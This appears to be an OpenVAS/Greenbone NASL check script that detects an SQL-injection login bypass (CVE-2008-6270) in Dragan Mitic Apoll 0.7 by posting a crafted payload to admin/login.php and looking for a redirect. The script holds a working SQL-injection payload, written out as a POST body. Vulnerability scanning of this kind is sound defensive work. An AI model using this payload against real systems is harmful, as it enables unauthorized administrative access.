if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100022" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_bugtraq_id( 32079 );
	script_cve_id( "CVE-2008-6270", "CVE-2008-6272" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2009-03-10 08:40:52 +0100 (Tue, 10 Mar 2009)" );
	script_name( "Dragan Mitic Apoll 'admin/index.php' SQL Injection Vulnerability" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2009 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release,
  disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "Dragan Mitic Apoll is prone to an SQL-injection vulnerability because it
  fails to sufficiently sanitize user-supplied data before using it in an SQL query." );
	script_tag( name: "impact", value: "Exploiting this issue could allow an attacker to compromise the application,
  access or modify data, or exploit latent vulnerabilities in the underlying database." );
	script_tag( name: "affected", value: "Dragan Mitic Apoll 0.7 is vulnerable. Other versions may also be affected." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
variables = "username=select username from ap_users' or ' 1=1'-- '&password=x";
host = http_host_name( port: port );
for dir in nasl_make_list_unique( "/apoll", "/poll", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = dir + "/admin/login.php";
	res = http_get_cache( item: url, port: port );
	if(!res || !IsMatchRegexp( res, "^HTTP/1\\.[01] 200" ) || ContainsString( res, "Location: index.php" )){
		continue;
	}
	referer = "http://" + host + url;
	req = http_post_put_req( port: port, url: url, data: variables, add_headers: make_array( "Referer", referer, "Content-Type", "application/x-www-form-urlencoded" ) );
	res = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
	if(egrep( pattern: "^Location: index\\.php", string: res )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

